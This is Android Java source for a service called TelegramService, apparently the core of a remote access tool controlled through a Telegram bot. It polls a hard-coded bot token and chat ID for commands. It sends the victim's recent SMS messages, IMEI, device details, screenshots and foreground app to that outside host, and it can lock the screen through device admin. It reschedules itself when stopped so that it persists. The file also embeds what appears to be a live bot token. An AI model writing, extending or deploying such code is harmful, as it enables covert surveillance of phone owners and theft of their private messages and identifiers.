package com.monitor;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramService extends Service {

    // 🔐 Bot Credentials
    private static final String BOT_TOKEN = "8621908735:AAHV_oueLnWyNfJ9daroY3-UOF_jbrjThFE";
    private static final String CHAT_ID = "8640134736";

    private boolean isRunning = false;
    private long lastUpdateId = 0;
    private MediaPlayer mediaPlayer;
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    // 🔧 Native C++ Support
    private static boolean isCPlusPlusLoaded = false;
    public native void processCommandNative(String message);
    static {
        try {
            System.loadLibrary("monitor");
            isCPlusPlusLoaded = true;
        } catch (Throwable t) {
            isCPlusPlusLoaded = false;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification("Bot Active", "Listening for Commands..."));

        isRunning = true;
        startPollingThread();

        // Send connection message with all commands
        String deviceInfo = Build.MANUFACTURER + " " + Build.MODEL;
        sendTelegramMessage("✅ *Device Connected!*\n\n📱 Model: " + deviceInfo +
							"\n\n*Commands:*\n" +
							"/video <url> - Play video in app\n" +
							"/audio <url> - Play audio\n" +
							"/toast <text> - Show toast\n" +
							"/battery - Battery info\n" +
							"/phoneinfo - Device info\n" +
							"/lock - Lock screen\n" +
							"/unlock - Wake screen\n" +
							"/flash on|off - Flashlight\n" +
							"/sms - Last 5 SMS\n" +
							"/activity - Current foreground app\n" +
							"/screen - Take screenshot\n" +
							"/play <url> - (Native) Play video");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    // ============= TELEGRAM COMMUNICATION =============
    private void sendTelegramMessage(final String text) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&parse_mode=Markdown&text=" + Uri.encode(text);
						HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
						conn.setRequestMethod("GET");
						conn.getResponseCode();
						conn.disconnect();
					} catch (Exception e) {
						Log.e("BotService", "Send error: " + e.getMessage());
					}
				}
			}).start();
    }

    // Static sender for other components (ScreenshotService)
    public static void sendMessageToTelegramStatic(Context context, final String text) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&parse_mode=Markdown&text=" + Uri.encode(text);
						HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
						conn.setRequestMethod("GET");
						conn.getResponseCode();
						conn.disconnect();
					} catch (Exception e) {
						Log.e("BotService", "Static send error: " + e.getMessage());
					}
				}
			}).start();
    }

    // Static photo sender (for screenshot)
    public static void sendPhotoToTelegramStatic(Context context, final byte[] photoBytes) {
        new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						String boundary = "*****" + System.currentTimeMillis() + "*****";
						String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
						URL url = new URL(urlString);
						HttpURLConnection conn = (HttpURLConnection) url.openConnection();
						conn.setRequestMethod("POST");
						conn.setDoOutput(true);
						conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

						ByteArrayOutputStream baos = new ByteArrayOutputStream();
						baos.write(("--" + boundary + "\r\n").getBytes());
						baos.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
						baos.write((CHAT_ID + "\r\n").getBytes());
						baos.write(("--" + boundary + "\r\n").getBytes());
						baos.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n").getBytes());
						baos.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
						baos.write(photoBytes);
						baos.write(("\r\n--" + boundary + "--\r\n").getBytes());
						baos.flush();

						conn.getOutputStream().write(baos.toByteArray());
						int responseCode = conn.getResponseCode();
						conn.disconnect();
						Log.d("BotService", "Photo sent, response: " + responseCode);
					} catch (Exception e) {
						Log.e("BotService", "Photo send error: " + e.getMessage());
					}
				}
			}).start();
    }

    private void startPollingThread() {
        new Thread(new Runnable() {
				@Override
				public void run() {
					while (isRunning) {
						try {
							String apiUrl = "https://api.telegram.org/bot" + BOT_TOKEN +
                                "/getUpdates?offset=" + lastUpdateId + "&timeout=10";
							HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
							conn.setRequestMethod("GET");
							if (conn.getResponseCode() == 200) {
								BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
								StringBuilder response = new StringBuilder();
								String line;
								while ((line = in.readLine()) != null) {
									response.append(line);
								}
								in.close();
								processTelegramResponse(response.toString());
							}
						} catch (Exception e) {
							try { Thread.sleep(3000); } catch (InterruptedException ie) {}
						}
					}
				}
			}).start();
    }

    private void processTelegramResponse(String jsonString) {
        try {
            JSONObject json = new JSONObject(jsonString);
            if (json.getBoolean("ok")) {
                JSONArray result = json.getJSONArray("result");
                for (int i = 0; i < result.length(); i++) {
                    JSONObject update = result.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id") + 1;
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        if (message.has("text")) {
                            String text = message.getString("text").trim();
                            handleCommand(text);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ============= COMMAND HANDLER (Final fixed) =============
    private void handleCommand(final String cmd) {
        final String lowerCmd = cmd.toLowerCase();
        try {
            if (lowerCmd.startsWith("/video ")) {
                String url = cmd.substring(7).trim();
                playVideoInApp(url);
            } else if (lowerCmd.startsWith("/audio ")) {
                String url = cmd.substring(7).trim();
                playAudio(url);
            } else if (lowerCmd.startsWith("/toast ")) {
                String msg = cmd.substring(7).trim();
                showToast(msg);
            } else if (lowerCmd.equals("/battery")) {
                sendBatteryInfo();
            } else if (lowerCmd.equals("/phoneinfo")) {
                sendPhoneInfo();
            } else if (lowerCmd.equals("/lock")) {
                lockScreen();
            } else if (lowerCmd.equals("/unlock")) {
                unlockScreen();
            } else if (lowerCmd.startsWith("/flash ")) {
                String sub = cmd.substring(7).trim().toLowerCase();
                if (sub.equals("on")) {
                    setFlashlight(true);
                } else if (sub.equals("off")) {
                    setFlashlight(false);
                } else {
                    sendTelegramMessage("Usage: /flash on|off");
                }
            } else if (lowerCmd.equals("/sms")) {
                readRecentSms();
            } else if (lowerCmd.equals("/activity")) {
                getForegroundActivity();
            } else if (lowerCmd.equals("/screen")) {
                takeScreenshot();
            } else if (isCPlusPlusLoaded && lowerCmd.startsWith("/play ")) {
                // Direct call (native is safe on main thread)
                processCommandNative(cmd);
            } else {
                sendTelegramMessage("Unknown command: " + cmd);
            }
        } catch (Exception e) {
            sendTelegramMessage("Error executing command: " + e.getMessage());
        }
    }

    // ============= FEATURE IMPLEMENTATIONS =============
    private void playVideoInApp(final String videoUrl) {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					Intent intent = new Intent(getApplicationContext(), PlayerActivity.class);
					intent.putExtra("video_url", videoUrl);
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivity(intent);
					sendTelegramMessage("▶️ Playing video in custom player.");
				}
			});
    }

    // Called from native code via JNI
    public void playVideo(String url) {
        playVideoInApp(url);
    }

    private void playAudio(final String audioUrl) {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					try {
						if (mediaPlayer != null) {
							mediaPlayer.release();
						}
						mediaPlayer = new MediaPlayer();
						mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
						mediaPlayer.setDataSource(audioUrl);
						mediaPlayer.prepareAsync();
						mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
								@Override
								public void onPrepared(MediaPlayer mp) {
									mp.start();
								}
							});
						sendTelegramMessage("🔊 Audio playback started.");
					} catch (Exception e) {
						sendTelegramMessage("❌ Audio error: " + e.getMessage());
					}
				}
			});
    }

    private void showToast(final String msg) {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
					sendTelegramMessage("✅ Toast shown: " + msg);
				}
			});
    }

    private void sendBatteryInfo() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
        float batteryPct = level * 100 / (float) scale;
        int status = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1) : -1;
        String statusStr;
        if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
            statusStr = "Charging";
        } else if (status == BatteryManager.BATTERY_STATUS_DISCHARGING) {
            statusStr = "Discharging";
        } else if (status == BatteryManager.BATTERY_STATUS_FULL) {
            statusStr = "Full";
        } else {
            statusStr = "Unknown";
        }
        sendTelegramMessage(String.format("🔋 Battery: %.0f%% (%s)", batteryPct, statusStr));
    }

    private void sendPhoneInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = "N/A";
        if (tm != null) {
            try {
                if (checkSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= 26) {
                        imei = tm.getImei();
                    } else {
                        imei = tm.getDeviceId();
                    }
                } else {
                    imei = "Permission denied";
                }
            } catch (Exception e) {
                imei = "Error";
            }
        }
        String info = "📱 *Device Info*\n" +
			"Model: " + Build.MODEL + "\n" +
			"Manufacturer: " + Build.MANUFACTURER + "\n" +
			"Android: " + Build.VERSION.RELEASE + "\n" +
			"IMEI: " + imei + "\n" +
			"Network: " + (tm != null ? tm.getNetworkOperatorName() : "N/A");
        sendTelegramMessage(info);
    }

    private void lockScreen() {
        android.app.admin.DevicePolicyManager dpm =
			(android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, MyAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(comp)) {
            dpm.lockNow();
            sendTelegramMessage("🔒 Screen locked.");
        } else {
            sendTelegramMessage("❌ Device Admin not enabled. Please activate in settings.");
        }
    }

    private void unlockScreen() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(
			PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
			"monitor:unlock");
        wl.acquire(3000);
        sendTelegramMessage("🔓 Wake lock triggered. Screen should turn on.");
    }

    private void setFlashlight(final boolean on) {
        if (Build.VERSION.SDK_INT >= 23) {
            CameraManager camManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            try {
                String cameraId = camManager.getCameraIdList()[0];
                camManager.setTorchMode(cameraId, on);
                sendTelegramMessage("💡 Flashlight " + (on ? "ON" : "OFF"));
            } catch (CameraAccessException e) {
                sendTelegramMessage("❌ Flashlight error: " + e.getMessage());
            }
        } else {
            sendTelegramMessage("❌ Flashlight requires Android 6+");
        }
    }

    private void readRecentSms() {
        if (checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            sendTelegramMessage("❌ SMS permission not granted.");
            return;
        }
        try {
            Cursor cursor = getContentResolver().query(
				Telephony.Sms.Inbox.CONTENT_URI,
				new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
				null, null, Telephony.Sms.DATE + " DESC LIMIT 5");
            if (cursor != null) {
                StringBuilder sb = new StringBuilder("📨 *Last SMS:*\n");
                int count = 0;
                while (cursor.moveToNext() && count < 5) {
                    String address = cursor.getString(0);
                    String body = cursor.getString(1);
                    long date = cursor.getLong(2);
                    sb.append("From: ").append(address).append("\n");
                    sb.append("Msg: ").append(body.length() > 100 ? body.substring(0, 97) + "..." : body).append("\n");
                    sb.append("---\n");
                    count++;
                }
                cursor.close();
                if (count == 0) sb.append("No SMS found.");
                sendTelegramMessage(sb.toString());
            } else {
                sendTelegramMessage("No SMS cursor.");
            }
        } catch (Exception e) {
            sendTelegramMessage("❌ SMS read error: " + e.getMessage());
        }
    }

    private void getForegroundActivity() {
        String pkg = MyAccessibilityService.currentPackage;
        String act = MyAccessibilityService.currentActivity;
        if (pkg == null || pkg.isEmpty()) {
            sendTelegramMessage("📱 No activity info. Please enable Accessibility Service.");
        } else {
            sendTelegramMessage("📱 Current app: " + pkg + "\nActivity: " + act);
        }
    }

    private void takeScreenshot() {
        mainHandler.post(new Runnable() {
				@Override
				public void run() {
					Intent intent = new Intent(TelegramService.this, ScreenshotActivity.class);
					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivity(intent);
				}
			});
    }

    // ============= HELPER METHODS =============
    private Notification buildNotification(String title, String text) {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= 26) {
            builder = new Notification.Builder(this, "bot_service_channel");
        } else {
            builder = new Notification.Builder(this);
        }
        return builder.setContentTitle(title)
			.setContentText(text)
			.setSmallIcon(android.R.drawable.ic_dialog_info)
			.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
				"bot_service_channel",
				"Bot Background",
				NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        sendTelegramMessage("⚠️ Service stopped. Scheduling restart...");
        scheduleRestart();
        if (mediaPlayer != null) {
            mediaPlayer.release();
        }
    }

    private void scheduleRestart() {
        Intent intent = new Intent(this, KeepAliveReceiver.class);
        int flags = (Build.VERSION.SDK_INT >= 23) ?
			PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
			PendingIntent.FLAG_UPDATE_CURRENT;
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, flags);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null) {
            am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pi);
        }
    }
}
